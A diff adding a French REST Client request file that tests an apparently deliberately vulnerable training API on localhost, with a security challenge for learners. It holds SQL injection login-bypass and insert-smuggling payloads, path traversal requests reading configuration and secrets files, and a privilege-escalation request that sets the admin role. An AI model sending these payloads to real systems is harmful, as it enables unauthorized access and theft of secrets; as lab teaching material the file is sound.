@@ -1,0 +1,125 @@
+### API DevSecOps - Tests
+### Installation extension VSCode : REST Client (humao.rest-client)
+### Utilisation : Cliquer sur "Send Request" au-dessus de chaque requête
+
+@baseUrl = http://localhost:3000
+
+###############################################################################
+# 1. Health Check
+###############################################################################
+
+### GET Health Check
+GET {{baseUrl}}/api/health
+
+###############################################################################
+# 2. Login (SQL Injection)
+###############################################################################
+
+### POST Login - Normal (va échouer si pas d'utilisateur)
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "admin123"
+}
+
+### POST Login - SQL Injection (bypass mot de passe)
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' --",
+  "password": "nimportequoi"
+}
+
+### POST Login - SQL Injection avec OR 1=1
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1",
+  "password": "test"
+}
+
+### POST Login - Utilisateur normal
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "user",
+  "password": "password"
+}
+
+###############################################################################
+# 3. Files (Path Traversal)
+###############################################################################
+
+### GET File - Légitime (toto.txt)
+GET {{baseUrl}}/api/files?name=toto.txt
+
+### GET File - Légitime (document.pdf)
+GET {{baseUrl}}/api/files?name=document.pdf
+
+### GET File - Path Traversal (package.json)
+GET {{baseUrl}}/api/files?name=../package.json
+
+### GET File - Path Traversal (.env.example)
+GET {{baseUrl}}/api/files?name=../.env.example
+
+### GET File - Path Traversal (database.js)
+GET {{baseUrl}}/api/files?name=../src/config/database.js
+
+### GET File - Path Traversal (secrets examples)
+GET {{baseUrl}}/api/files?name=../SECRETS_EXAMPLES.md
+
+###############################################################################
+# 4. Users (CHALLENGE - 7 vulnérabilités)
+###############################################################################
+
+### POST Create User - Normal
+POST {{baseUrl}}/api/users
+Content-Type: application/json
+
+{
+  "email": "test@example.com",
+  "password": "testpassword",
+  "role": "user"
+}
+
+### POST Create User - Privilege Escalation (se donner le rôle admin)
+POST {{baseUrl}}/api/users
+Content-Type: application/json
+
+{
+  "email": "hacker@evil.com",
+  "password": "test",
+  "role": "admin"
+}
+
+### POST Create User - SQL Injection dans email
+POST {{baseUrl}}/api/users
+Content-Type: application/json
+
+{
+  "email": "hacker', 'hacker@evil.com', 'hacked123', 'admin'); --",
+  "password": "test",
+  "role": "user"
+}
+
+### POST Create User - Email invalide (pas de validation)
+POST {{baseUrl}}/api/users
+Content-Type: application/json
+
+{
+  "email": "pas-un-email",
+  "password": "x",
+  "role": "superadmin"
+}
+
+###############################################################################
+# 5. Documentation
+###############################################################################
+
+### GET Documentation (liste des endpoints)
+GET {{baseUrl}}/
